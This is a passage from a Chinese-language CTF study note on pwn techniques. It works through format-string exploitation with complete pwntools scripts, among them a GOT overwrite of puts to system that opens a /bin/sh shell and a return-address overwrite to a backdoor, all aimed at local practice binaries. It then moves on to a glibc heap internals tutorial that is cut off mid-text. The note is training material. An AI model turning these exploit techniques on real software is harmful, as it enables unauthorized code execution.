    puts("modified b for a big number!");
  }
  return 0;
}
```

```shell
#执行程序后输入
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
#程序输出
AAAA0xff8f04080xf7effa700xf7f1ac080xf7f19d000xff8f052c0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250xf7d2dd000xf7ef01b00x10x80000xf7ed4000
#根据泄露A的ASCII码位置的顺序为第6，则第六个参数是被泄露的，格式化字符串攻击脚本为%6$n
```

```python
from pwn import *
sh = process('./overwrite')
c_addr = int(sh.recvuntil('\n', drop=True), 16) #丢弃"\n"，并接收16位的char s[100]的地址
print hex(c_addr)
payload = p32(c_addr) + 'a'*12 + '%6$n' #4Byte的C_addr地址加上12个a，总共为16个Byte，所以%6$n读取到16，将16写入到c_addr
print payload
sh.sendline(payload)
print sh.recv()
sh.interactive()
```

```shell
root@ubuntu:/home/sxylao1/pwn/questions/overwrite# python c.py 
[+] Starting local process './overwrite': pid 73883
0xffdb29ec
�)�\xffaaaaaaaaaaaa%6$n
[*] Process './overwrite' stopped with exit code 0 (pid 73883)
�)�\xffaaaaaaaaaaaamodified c.

[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$  
#c == 16 输出了modified c.
```

##### 覆盖任意地址内存

###### 覆盖小数字

```python
from pwn import *
sh = process('./overwrite')
a_addr = 0x0804A024
payload = 'aa%8$naa' + p32(a_addr)
# %8$n前的两个'a'被读取为2个长度(2Byte)写入%8$n表示的第8个参数位置
# 之前覆盖占内存地址时%6$n测出该程序在第6个参数的位置会泄露地址
# %8$n后面的两个'a'用于占位 占泄露地址的的第6个参数、第7个参数
# 而后p32(a_addr)的a地址作为第8个参数被%8$n读取前面的'aa'写入2 即a == 2
sh.sendline(payload)
print sh.recv()
sh.interactive()
```

```shell
root@ubuntu:/home/sxylao1/pwn/questions/overwrite# python exp1.py 
[+] Starting local process './overwrite': pid 26112
aa%8$naa$\xa0\x0
[*] Process './overwrite' stopped with exit code 0 (pid 26112)
0xffc302fc
aaaa$\xa0\x0modified a for a small number.

[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```

###### 覆盖大数字

```python
from pwn import *
sh = process('./overwrite')
b_addr=0x0804A028
payload = p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)
#一个地址占4Byte，每次地址+1，按1Byte逐个修改数值
payload += '%104x'+'%6$hhn'+'%222x'+'%7$hhn'+'%222x'+'%8$hhn'+'%222x'+'%9$hhn'
#前面p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)为4个地址16Byte
#%x$n会读取格式化字符串以前的的所有长度 在该条payload中每执行到一条格式化字符串都会读取之前的所有长度(格式化字符串不算)
#%104x为104个16进制数 即104Byte 16Byte + %104x == 16 + 104 == 120 == 0x78 %6$hhn写入1Byte即写入0x78
#%222x为222个16进制数 即222Byte 120Byte + %222x == 120 + 222 == 342 == 0x156 %7$hhn写入1Byte即写入0x56
#%222x为222个16进制数 即222Byte 342Byte + %222x == 342 + 222 == 564 == 0x234 %8$hhn写入1Byte即写入0x34
#%222x为222个16进制数 即222Byte 564Byte + %222x == 564 + 222 == 786 == 0x312 %9$hhn写入1Byte即写入0x12
#写入的0x78、0x56、0x34、0x12放在4Byte中即0x12345678 如此就可以将b的数值修改为0x12345678
sh.sendline(payload)
#sh.sendline(fmtstr_payload(6, {0x804A028:0x12345678}))
#pwntools自带的函数,很方便
print sh.recv()
sh.interactive()
```

经过执行攻击脚本之后得到了如下输出结果：

```shell
#else if (b == 0x12345678) {
#    puts("modified b for a big number!");
#  }
root@ubuntu:/home/sxylao1/pwn/questions/overwrite# python exp2.py 
[+] Starting local process './overwrite': pid 74214
[*] Process './overwrite' stopped with exit code 0 (pid 74214)
0xffc540bc
(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0                                                                                                       X                                                                                                                                                                                                                             p                                                                                                                                                                                                                                                                                                                                                                                                                                                         \x00modified b for a big number!

[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```

#### 题目练习

##### UIUCTF pwn200 GoodLuck(x64)

```shell
gdb pwn #进入gdb调试
b printf #在printf函数上下断点
pwndbg> r
Starting program: /home/sxylao1/pwn/questions/2017-UIUCTF-pwn200-GoodLuck/pwn 
what's the flag
123456
You answered:

Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28
28	printf.c: No such file or directory.
```

```gdb
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7fffffffdd78 —▸ 0x400890 (main+234) ◂— mov    edi, 0x4009b8
01:0008│      0x7fffffffdd80 ◂— 0x31000001
02:0010│      0x7fffffffdd88 —▸ 0x602830 ◂— 0x363534333231 /* '123456' */
03:0018│      0x7fffffffdd90 —▸ 0x602010 ◂— 0x77736e6120756f59 ('You answ')
04:0020│      0x7fffffffdd98 —▸ 0x7fffffffdda0 ◂— 0x756f797b67616c66 ('flag{you')
05:0028│      0x7fffffffdda0 ◂— 0x756f797b67616c66 ('flag{you')
06:0030│      0x7fffffffdda8 ◂— 0x2174695f7465675f ('_get_it!')
07:0038│      0x7fffffffddb0 ◂— 0xffffffff0a7d
```

在x64程序中，参数会被优先传递给RDI、RSI、RDX、RCX、R8、R9六个寄存器存储，而多出的参数会被存入栈空间。
在该问题中，格式化字符串占了RDI寄存器，即如上显示的信息mov    edi, 0x4009b8
栈空间中第四个参数为flag的信息，6个寄存器中除过RDI中的格式化字符串，剩下5个寄存器中的参数，加上栈空间中第4个参数
因此根据该信息可以得到5 + 4 = 9，即第9个参数位置是可以泄露出flag的，因此payload写为%9$s

```python
from pwn import *
sh = process('./pwn')
payload = "%9$s"
#gdb.attach(sh)
sh.sendline(payload)
sh.interactive()
```

```shell
root@ubuntu:/home/sxylao1/pwn/questions/2017-UIUCTF-pwn200-GoodLuck# python exp.py 
[+] Starting local process './pwn': pid 74319
[*] Switching to interactive mode
[*] Process './pwn' stopped with exit code 0 (pid 74319)
what's the flag
You answered:
flag{you_get_it!}
\xff\xff\xff\xff
But that was totally wrong lol get rekt
[*] Got EOF while reading in interactive
$
```

##### 2016 CCTF pwn3

在 C 语言中，没有开启 RELRO 保护的时候，GOT 表项可以被修改，当我们修改某个 GOT 表项的时候，比如把 printf 的 GOT 表项修改成 system 的地址，那执行 printf 的时候实际上是执行 system 的函数

```c
#如下为该程序中的反汇编后的伪代码
int __cdecl ask_password(char *s1)
{
  if ( strcmp(s1, "sysbdmin") )
  {
    puts("who you are?");
    exit(1);
  }
  return puts("welcome!");
}
```

```c
#如下为该程序中的反汇编后的伪代码
char *__cdecl ask_username(char *dest)
{
  char src[40]; // [esp+14h] [ebp-34h] BYREF
  int i; // [esp+3Ch] [ebp-Ch]

  puts("Connected to ftp.hacker.server");
  puts("220 Serv-U FTP Server v6.4 for WinSock ready...");
  printf("Name (ftp.hacker.server:Rainism):");
  __isoc99_scanf("%40s", src);
  for ( i = 0; i <= 39 && src[i]; ++i )
    ++src[i];
  return strcpy(dest, src);
}
```

如上所示，该代码的for循环中会把所有字符串的ASCII码值加1，而在判断账号的时候需要使其和`sysbdmin`相等，因此需要提前将`sysbdmin`的ASCII码值减1写入，即`rxraclhm`，程序中为它加1的时候，就可以使之和`sysbdmin`相等从而进入程序。

```shell
root@ubuntu:/home/sxylao1/pwn/questions/2016-CCTF-pwn3# ./pwn3 
Connected to ftp.hacker.server
220 Serv-U FTP Server v6.4 for WinSock ready...
Name (ftp.hacker.server:Rainism):rxraclhm
welcome!
ftp>
```

```c
//进入程序之后按照反编译的伪代码可知接下来需要输入命令
int get_command()
{
  char s1[12]; // [esp+1Ch] [ebp-Ch] BYREF

  __isoc99_scanf("%3s", s1);
  if ( !strncmp(s1, "get", 3u) )
    return 1;
  if ( !strncmp(s1, "put", 3u) )
    return 2;
  if ( !strncmp(s1, "dir", 3u) )
    return 3;
  return 4;
}
```

```c
//发现get_file函数中有格式化字符串漏洞
int get_file()
{
  char dest[200]; // [esp+1Ch] [ebp-FCh] BYREF
  char s1[40]; // [esp+E4h] [ebp-34h] BYREF
  char *i; // [esp+10Ch] [ebp-Ch]

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", s1);
  if ( !strncmp(s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, s1) )
    {
      strcpy(dest, i + 40);
      return printf(dest);
    }
  }
  return printf(dest);
}
```

先通过格式化字符串漏洞把 libc 泄露出来，再通过 libc 计算得到 system 的地址，把 system 的地址写道 puts 的 GOT 表项上，当执行程序 dir 功能的时候，因为有个 puts 函数，如果我们输入的参数是 '/bin/sh' 实际上就会执行 system('/bin/sh')

在 get 功能（get_file）的 printf 处下个断点：b *0x0804889E
![image-20230219110955636](./Pwn/2016-CCTF-pwn3_getfile_printf.png)

```gdb
pwndbg> b *0x0804889E
Breakpoint 1 at 0x804889e
pwndbg> r
Starting program: /home/sxylao1/pwn/questions/2016-CCTF-pwn3/pwn3 
Connected to ftp.hacker.server
220 Serv-U FTP Server v6.4 for WinSock ready...
Name (ftp.hacker.server:Rainism):rxraclhm
welcome!
ftp>put
please enter the name of the file you want to upload:111
then, enter the content:AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
ftp>get 
enter the file name you want to get:111
pwndbg> c
Continuing.
AAAA0x804b4380x40x804833e0xf7e6ee47(nil)0xf7fb75a00x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250xf7fb70000xf7fb75a00x10xffffcf38ftp>
```

根据输出可以得到格式化字符串会在第7个参数位置泄露数据，注：输出内容中的(nil)也是一个参数，即0x0
因为payload中打算把**要输出的puts_got地址写在格式化字符串后面**，所以要在第8个参数位置输出，即使用**%8$s**

```python
from pwn import *
sh = process('./pwn3') #本地连接
pwn3 = ELF('./pwn3') #解读elf信息
libc = pwn3.libc #创建libc对象
sh.recvuntil('Name (ftp.hacker.server:Rainism):') #等接收到了这条信息后
sh.sendline('rxraclhm') #发送'rxraclhm'
puts_got = pwn3.got['puts'] #获取puts_got地址
sh.sendline('put') #程序内功能
sh.recvuntil('please enter the name of the file you want to upload:')
sh.sendline('1111') #随便发送的
#gdb.attach(sh,'b* 0x0804889E')
sh.recvuntil('then, enter the content:') 
content='%8$s'+p32(puts_got) #创建攻击payload 第7个位置泄露数据 而puts_got写在后面为第8个参数
#根据数据小端序存储规则 接收程序输出的puts_got地址时 puts_got地址在前面 即直接[0:4]
sh.sendline(content) #发送payload
sh.sendline('get') #调用get功能
sh.recvuntil('enter the file name you want to get:')
sh.sendline('1111')
puts_addr = u32(sh.recv()[:4]) #触发格式化字符串 使程序输出puts_got地址 并使用攻击脚本接收该地址
libc_base=puts_addr-libc.symbols['puts'] #计算libc基址
sys_addr=libc_base+libc.symbols['system'] #获取system地址
payload = fmtstr_payload(7, {puts_got: sys_addr}) #使用pwntools函数直接将puts函数地址替换为system地址的payload
#从此处开始再put get一遍修改system并发送/bin/sh参数
sh.sendline('put') #put方法
sh.recvuntil('please enter the name of the file you want to upload:')
sh.sendline('/bin/sh;')
#在字符串中使用分号 ; 可以避免在输入 /bin/sh 后出现其他不必要的字符 特别是如果程序接受并处理类似于空字符 \0 这样的字符 将其作为字符串的一部分 可能会导致字符串截断，导致程序无法执行所需的操作 使用分号 ; 可以避免这个问题 因为分号是常规的命令分隔符 在大多数情况下被程序认为是一个单独的命令而不是字符串的一部分。
sh.recvuntil('then, enter the content:')
sh.sendline(payload)
#因为输入了/bin/sh;作为参数 原本执行puts("/bin/sh;") 但是因为payload中将puts替换为system 所以会执行system('/bin/sh;')
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
sh.sendline('/bin/sh;') 
#刚才puts的时候将/bin/sh;作为了一个文件名字 现在用程序get功能获取 就可以通过漏洞调用更改过后的system('/bin/sh;')取得shell
sh.sendline('dir')
sh.interactive()
```

##### 三个白帽-pwnme_k0

先查看程序的位数，已经开启了什么保护。

```shell
root@ubuntu:/home/sxylao1/pwn/questions/baimao# checksec pwnme 
[*] '/home/sxylao1/pwn/questions/baimao/pwnme'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

IDA64反汇编，Shift + F12打开字符串，可以看见/bin/sh，该程序有被作者留下后门，双进进入/bin/sh查看地址

![image-20230219163333816](./Pwn/三个白帽.png)

双击此处跳回/bin/sh

![image-20230219163813396](./Pwn/三个白帽_bin_sh.png)

只要能跳转到这两个地址就可以直接执行system('/bin/sh')从后门获取shell

![image-20230219163932086](./Pwn/三个白帽_后门地址.png)

在IDA中参考**伪代码**并依照**程序运行流程**找到会造成格式化字符串的**printf函数**

![image-20230219164949066](./Pwn/三个白帽_printf.png)

gdb调试程序获取用户输入时写入**AAAA%p%p%p%p%p%p%p%p%p**
然后再选择程序中的账号信息显示功能，由此触发格式化字符串漏洞

```shell
root@ubuntu:/home/sxylao1/pwn/questions/baimao# gdb pwnme 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from pwnme...(no debugging symbols found)...done.
pwndbg> b *0x400B39
Breakpoint 1 at 0x400b39
pwndbg> r
Starting program: /home/sxylao1/pwn/questions/baimao/pwnme 
**********************************************
*                                            *
*Welcome to sangebaimao,Pwnn me and have fun!*
*                                            *
**********************************************
Register Account first!
Input your username(max lenth:20): 
AAAA
Input your password(max lenth:20): 
%p%p%p%p%p%p%p%p%p
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>1
Welc0me to sangebaimao!
AAAA
#由于刚才下了断点程序会在此处停下来
```

```shell
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x400b39    call   0x400770 #此处程序还没有call进行调用printf
 
   0x400b3e    nop    
   0x400b3f    pop    rbp
   0x400b40    ret    
 
   0x400b41    push   rbp
   0x400b42    mov    rbp, rsp
   0x400b45    sub    rsp, 0x270
   0x400b4c    mov    qword ptr [rbp - 0x268], rdi
   0x400b53    mov    edi, 0x4010e0
   0x400b58    call   0x400750
 
   0x400b5d    mov    rax, qword ptr [rip + 0x2014ac] <0x602010>
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rbp rsp  0x7fffffffdd10 —▸ 0x7fffffffdd50 —▸ 0x7fffffffde00 —▸ 0x400eb0 ◂— push   r15 
#0x7fffffffdd50包含着上面call printf的ebp
01:0008│          0x7fffffffdd18 —▸ 0x400d74 ◂— add    rsp, 0x30 #此处为printf函数执行完后的返回地址
#修改此处的返回地址为程序作者留下的后门地址即可拿下该程序的shell
02:0010│          0x7fffffffdd20 ◂— 0xa41414141 /* 'AAAA\n' */
03:0018│          0x7fffffffdd28 ◂— 0x0
04:0020│ rdi-4    0x7fffffffdd30 ◂— 0x7025702500000000
05:0028│          0x7fffffffdd38 ◂— 0x7025702570257025 ('%p%p%p%p')
06:0030│          0x7fffffffdd40 ◂— 0xa702570257025 /* '%p%p%p\n' */
07:0038│          0x7fffffffdd48 —▸ 0x400d4d ◂— cmp    eax, 2
```

```shell
pwndbg> c
Continuing.
0x6030100x7ffff7dd37800x50x7ffff7fdd7000x50x7fffffffdd500x400d740xa41414141(nil)
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>
#64位程序前6个参数存在寄存器中，RDI中为格式化字符串，而后五个参数按顺序存在RSI、RDX、RCX、R8、R9，多出来的参数存入栈中
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rbp rsp  0x7fffffffdd10 —▸ 0x7fffffffdd50 —▸ 0x7fffffffde00 —▸ 0x400eb0 ◂— push   r15 #第6个参数
01:0008│          0x7fffffffdd18 —▸ 0x400d74 ◂— add    rsp, 0x30 #第7个参数
02:0010│          0x7fffffffdd20 ◂— 0xa41414141 /* 'AAAA\n' */ #第8个参数
03:0018│          0x7fffffffdd28 ◂— 0x0 #第9个参数
04:0020│ rdi-4    0x7fffffffdd30 ◂— 0x7025702500000000 #第10个参数
05:0028│          0x7fffffffdd38 ◂— 0x7025702570257025 ('%p%p%p%p') #第11个参数
06:0030│          0x7fffffffdd40 ◂— 0xa702570257025 /* '%p%p%p\n' */ #第12个参数
07:0038│          0x7fffffffdd48 —▸ 0x400d4d ◂— cmp    eax, 2 #第...个参数
```

修改第7个参数，即修改printf函数的返回地址为作者留下的后门。但是目前不知道它的地址，即不知道要修改的地址在内存哪里，可以先泄露第6个参数，因为第6、7个参数直接的偏移(差值)是相同的，所以用偏移+第6个参数的地址即可获得第7个参数的地址并进行修改。

**第六个参数 0x7fffffffdd50 - 第7个参数 0x7fffffffdd18 = 0x38** 由此可以计算得到二者偏移地址为0x38 **栈空间地址由高到低 所以是减**

```python
from pwn import *
sh=process("./pwnme")
binary=ELF("pwnme")
#gdb.attach(sh,'b *0x400b39')

sh.recv() #接收到信息后
sh.sendline("1111") #向程序输入1111
sh.recv() #接收到信息后
sh.sendline("%6$p") #泄露第6个参数的地址
sh.recv() #接收到信息后
sh.sendline("1") #选择程序的1号功能 即显示信息触发格式化字符串漏洞
sh.recvuntil("0x") #接收到0x信息后
recv=sh.recvline() #接收来自程序输出的一整行数据 第6个参数的下一个参数 即printf函数结束后的返回地址
print "ebp addr"+str(recv) #接收来自程序输出的第6个参数的地址 即ebp
ret_addr = int(recv,16) - 0x38 #通过减去偏移取得第7个参数的地址 即执行完printf函数后的返回地址
print "ret addr"+str(ret_addr) #输出存储返回地址的内存地址

sh.recv() #接收到信息后
sh.sendline("2") #选择程序的2号功能 让程序向用户获取输入
sh.recv() #接收到信息后
sh.sendline('111') #随便给程序输入
#sh.sendline(p64(ret_addr))
sh.recv() #接收到信息后
payload="%2214d%12$hn"+p64(ret_addr) 
#2214 = 0x8A6 因为是hn 所以写入2Byte 即0x08A6 参考如上的栈空间数据 格式化字符串会一直到第12个参数
#后面跟上p64(ret_addr)的返回地址 "%2214d%12$hn"会将
#返回地址的0x400d74后2Byte字节的0x0D74 改为 0x08A6 最后得到的地址即为作者留下的后门地址0x4008A6 
sh.send(payload) #发送攻击payload

sh.recv() #接收到信息后
sh.sendline("1") #选择程序的1号功能
sh.recv() #接收到信息后
sh.interactive() #激活payload攻击中的格式化字符串漏洞
```

### Heap Exploitation

#### GLibc Heap Internals

[【CTF】GLibc堆利用入门-机制介绍\_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV117411w7o2/?spm_id_from=333.788.recommend_more_video.4&vd_source=2474c2089bb9a19ecff81199bd7f94eb)
https://github.com/SignorMercurio/Heap-Tutorials
个人认为wiki的堆讲的比较浅显易懂，可以优先看wiki。
建议结合蒸米的文章和下面的文章一起看，下文会比较深入。

本文将对 Glibc 堆上的内存管理作简要介绍，部分内容翻译自参考资料中的文章。略过了许多细节，主要是为了对新手友好。
默认读者熟悉操作系统、C 语言及其运行机制，并且对于 C 中的函数调用栈有所了解。

##### 什么是堆

堆是每个程序被分配到的一块内存区域，和栈的区别主要在于堆内存是动态分配的。也就是说，程序可以从`heap`段请求一块内存，或者释放一块内存。

另外，堆内存是全局的，即在程序的任意位置都可以访问到堆，并不一定要在调用`malloc`的那个函数里访问。这是因为 C 语言使用指针指向动态分配的内存。但相比访问栈上的静态局部变量，使用指针也带来了一定的开销。

##### 使用动态分配的内存

GLibc 采用 ptmalloc2 内存分配器管理堆内存，相比前身 dlmalloc，它增加了对多线程的支持。多线程的好处就不多赘述了。

借助`stdlib.h`我们可以使用`malloc`和`free`函数来操作堆内存：

```c
char *buffer = (char *)malloc(10);

strcpy(buffer, "hello");
printf("%s\n", buffer);

free(buffer);
```

第一行分配了 10 字节给`buffer`，注意这里的强制类型转换是必须的；第 2-3 行使用了`buffer`这块内存，并在最后一行释放。

下面是`malloc`和`free`函数的注释：

```c
/*
  malloc(size_t n)
  Returns a pointer to a newly allocated chunk of at least n bytes, or null
  if no space is available. Additionally, on failure, errno is
  set to ENOMEM on ANSI C systems.

  If n is zero, malloc returns a minumum-sized chunk. (The minimum
  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit
  systems.)  On most systems, size_t is an unsigned type, so calls
  with negative arguments are interpreted as requests for huge amounts
  of space, which will often fail. The maximum supported value of n
  differs across systems, but is in all cases less than the maximum
  representable value of a size_t.
*/

/*
  free(void* p)
  Releases the chunk of memory pointed to by p, that had been previously
  allocated using malloc or a related routine such as realloc.
  It has no effect if p is null. It can have arbitrary (i.e., bad!)
  effects if p has already been freed.

  Unless disabled (using mallopt), freeing very large spaces will
  when possible, automatically trigger operations that give
  back unused memory to the system, thus reducing program footprint.
*/
```

注意，即使申请 0 字节内存，`malloc`依然会分配一个最小的 chunk；如果传给`free`的参数是空指针，`free`不会做任何事，而如果传入的是一个已经`free`过的指针，那么后果是不可预期的。这里尤其需要注意的是，与`Java`等语言不同，C 语言中释放掉分配到的内存的责任在于程序员，并且分配到的内存只应使用*一次*。

这两个函数在更底层上是使用`brk()`和`mmap()`这两个系统调用来管理内存的。

##### 两个系统调用

注意申请内存时，Linux 内核只会先分配一段虚拟内存，真正使用时才会映射到物理内存上去。

###### brk()

`brk()`通过增加`break location`来获取内存，一开始`heap`段的起点`start_brk`和`heap`段的终点`brk`指向同一个位置。

- ASLR 关闭时，两者指向 data/bss 段的末尾，也就是`end_data`
- ASLR 开启时，两者指向 data/bss 段的末尾加上一段随机 brk 偏移

![Process Virtual Memory Layout](https://i2.wp.com/static.duartes.org/img/blogPosts/linuxFlexibleAddressSpaceLayout.png?zoom=2)

> 注：注意与`sbrk()`的区别，后者是 C 语言库函数，`malloc`源码中的`MORECORE`就是调用的`sbrk()`。

###### mmap()

用于创建私有的匿名映射段，主要是为了分配一块新的内存，且这块内存只有调用`mmap()`的进程可以使用，所以称之为私有的。与之进行相反操作的是`munmap()`，删除一块内存区域上的映射。

##### 多线程与 Arena

前面提到，ptmalloc2 的一大改进就在于多线程，那么他是如何做到的呢？不难猜到，每个线程必定要维护一些独立的数据结构，并且对这些数据结构的访问是需要加锁的。的确，在 ptmalloc2 中，每个线程拥有自己的`freelist`，也就是维护空闲内存的一个链表；以及自己的`arena`，一段连续的堆内存区域。特别地，主线程的`arena`叫做`main_arena`。注意**只有`main_arena`可以访问`heap`段和`mmap`映射区域，`non_main_arena`只能访问`mmap`映射区域**。

> 注：线程较多时，互斥锁机制会导致性能下降。

当我们在程序中第一次申请内存时还没有`heap`段，因此 132KB 的`heap`段，也就是我们的`main_arena`，会被创建（**通过`brk()`**），无论我们申请的内存是多大。对于接下来的内存申请，`malloc`都会从`main_arena`中尝试取出一块内存进行分配。如果空间不够，`main_arena`可以通过`brk()`扩张；如果空闲空间太多，也可以缩小。

那么对于`non_main_arena`呢？前面提到它只能访问`mmap`映射区域，因为在创建时它就是由`mmap()`创建的——1MB 的内存空间会被映射到进程地址空间，不过实际上只有 132KB 是可读写的，这 132KB 就是该线程的`heap`结构，或者叫`non_main_arena`。

> 注：当然了，当申请的空间大于 128KB 且`arena`中没有足够空间时，无论在哪个`arena`里都只能通过`mmap()`分配内存。

`arena`也不是和线程一对一的，实际上有数量限制：

```c
For 32 bit systems:
     Number of arena = 2 * number of cores.
For 64 bit systems:
     Number of arena = 8 * number of cores.
```

而当我们`free`一小块内存时，内存也不会直接归还给内核，而是给 ptmalloc2 让他去维护，后者会将空闲内存丢入 bin 中，或者说`freelist`中也可以。如果过了一会我们的程序又要申请内存，那么 ptmalloc2 就会从 bin 中找一块空闲的内存进行分配，找不到的话才会去问内核要内存。

##### 维护多个堆

前面提到，`main_arena`只有一个堆，并且可以灵活地放缩；`non_main_arena`则只能通过`mmap()`获得一个堆。那么如果`non_main_arena`里分配的堆内存不够了怎么办？很简单，再`mmap()`一次，创建一个新的堆。

所以，在`non_main_arena`里，我们必须考虑如何维护多个堆的问题。这里我们会涉及三个头部：

- `heap_info`：每个堆的头部，`main_arena`是没有的
- `malloc_state`：`arena`的头部，`main_arena`的这个部分是**全局变量**而不属于堆段
- `malloc_chunk`：每个 chunk 的头部

具体一点，`heap_info`完整定义如下：

```c
typedef struct _heap_info
{
  mstate ar_ptr; /* Arena for this heap. */
  struct _heap_info *prev; /* Previous heap. */
  size_t size;   /* Current size in bytes. */
  size_t mprotect_size; /* Size in bytes that has been mprotected
                           PROT_READ|PROT_WRITE.  */
  /* Make sure the following data is properly aligned, particularly
     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of
     MALLOC_ALIGNMENT. */
  char pad[-6 * SIZE_SZ & MALLOC_ALIGN_MASK];
} heap_info;
```

而`malloc_state`的完整定义如下：

{% raw %}<details><summary>👇</summary>{% endraw %}

```c
struct malloc_state
{
  /* Serialize access.  */
  mutex_t mutex;

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;

  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;

  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */
  INTERNAL_SIZE_T attached_threads;

  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};
```

{% raw %}</details>{% endraw %}

其中`INTERNAL_SIZE_T`默认和`size_t`相同：

```c
#ifndef INTERNAL_SIZE_T
#define INTERNAL_SIZE_T size_t
#endif
```

在后面介绍 chunk 和 bin 的时候，我们会发现其中几个字段的作用，`malloc_chunk`我们也会在后面看到。

对于`arena`中只有单个堆的情况：
![Single Heap](https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720)

对于`non_main_arena`中有多个堆的情况：
![Multiple Heap](https://docs.google.com/drawings/d/150bTi0uScQlnABDImLYS8rWyL82mmfpMxzRbx-45UKw/pub?w=960&h=720)

注意到有多个堆的情况下，旧的堆的 Top chunk 会被认为是普通的空闲块。

##### Chunk 的结构

通俗地说，一块由分配器分配的内存块叫做一个 chunk，包含了元数据和用户数据。具体一点，chunk 完整定义如下：

```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;                /* double links -- used only if free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;
```

这里出现的6个字段均为元数据。

一个 chunk 可以是以下几种类型之一：

- 已分配的（Allocated chunk）
- 空闲的（Free chunk）
- Top chunk
- Last Remainder chunk

###### Allocated chunk

![](./Pwn/Allocated Chunk.png)

第一个部分（32 位上 4B，64 位上 8B）叫做`prev_size`，只有在前一个 chunk 空闲时才表示前一个块的大小，否则这里就是无效的，可以被前一个块征用（存储用户数据）。

> 这里的前一个chunk，指内存中相邻的前一个，而不是freelist链表中的前一个。`PREV_INUSE`代表的“前一个chunk”同理。

第二个部分的高位存储当前 chunk 的大小，低 3 位分别表示：

- P: `PREV_INUSE` 之前的 chunk 已经被分配则为 1
- M: `IS_MMAPED` 当前 chunk 是`mmap()`得到的则为 1
- N: `NON_MAIN_ARENA` 当前 chunk 在`non_main_arena`里则为 1

对应源码如下：

```c
/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */
#define PREV_INUSE 0x1

/* extract inuse bit of previous chunk */
#define prev_inuse(p)       ((p)->size & PREV_INUSE)


/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */
#define IS_MMAPPED 0x2

/* check for mmap()'ed chunk */
#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)


/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained
   from a non-main arena.  This is only set immediately before handing
   the chunk to the user, if necessary.  */
#define NON_MAIN_ARENA 0x4

/* check for chunk from non-main arena */
#define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)
```

你可能会有几个困惑：

1. `fd`、`bk`、`fd_nextsize`、`bk_nextsize`这几个字段去哪里了？
   对于已分配的 chunk 来说它们没用，所以也被征用了，用来存储用户数据。

2. 为什么第二个部分的低 3 位就这么被吞了而不会影响`size`？
   这是因为`malloc`会将用户申请的内存大小转化为实际分配的内存，以此来满足（至少）8字节对齐的要求，同时留出额外空间存放 chunk 头部。由于（至少）8字节对齐了，低3位自然就没用了。在获取真正的`size`时，会忽略低3位：

```c
/*
   Bits to mask off when extracting size

